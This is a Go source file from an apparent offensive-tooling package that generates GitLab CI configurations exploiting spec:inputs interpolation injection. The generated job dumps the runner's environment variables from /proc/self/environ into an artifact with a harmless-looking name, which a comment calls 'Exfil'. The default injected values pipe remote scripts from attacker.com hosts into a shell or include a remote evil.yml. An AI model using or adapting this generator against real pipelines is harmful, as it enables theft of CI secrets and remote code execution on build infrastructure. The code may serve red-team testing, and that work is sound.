package payloads

import "fmt"

// SpecInputsOptions configures a spec:inputs interpolation injection payload.
type SpecInputsOptions struct {
	Common         CommonOptions
	InputKey       string // input parameter name to abuse (default: "environment")
	MaliciousValue string // value that breaks interpolation context
	TargetTemplate string // component/template path
	InjectionType  string // yaml-key|script|include (default: "script")
}

// GenerateSpecInputsInjectionYAML generates a CI config that abuses spec:inputs
// interpolation to inject arbitrary YAML through crafted input values.
func GenerateSpecInputsInjectionYAML(o SpecInputsOptions) string {
	name, stage := o.Common.defaults("spec-inject")
	if o.InputKey == "" {
		o.InputKey = "environment"
	}
	if o.TargetTemplate == "" {
		o.TargetTemplate = "gitlab.com/templates/deploy@main"
	}
	if o.MaliciousValue == "" {
		o.MaliciousValue = defaultInjectionValue(o.InjectionType)
	}

	return fmt.Sprintf(`include:
  - component: %s
    inputs:
      %s: %q

stages: [%s]

%s:
  stage: %s%s%s
  script:
    - |
      # Exfil via xargs + head (reads env from /proc without printenv)
      xargs -0 -L1 < /proc/self/environ 2>/dev/null | sort > .spec-validation.log || true
  artifacts:
    when: always
    paths:
      - .spec-validation.log
    expire_in: 1 day
  allow_failure: true%s
`, o.TargetTemplate, o.InputKey, o.MaliciousValue,
		stage, name, stage, imageLine(o.Common.Image), tagsLine(o.Common.Tags),
		rulesManual(o.Common.Manual))
}

func defaultInjectionValue(injectionType string) string {
	switch injectionType {
	case "yaml-key":
		return "production\nmalicious_job:\n  script:\n    - curl http://attacker.com | sh"
	case "include":
		return "production\ninclude:\n  - remote: https://attacker.com/evil.yml"
	default:
		return "production; curl http://attacker.com/c2 | sh #"
	}
}
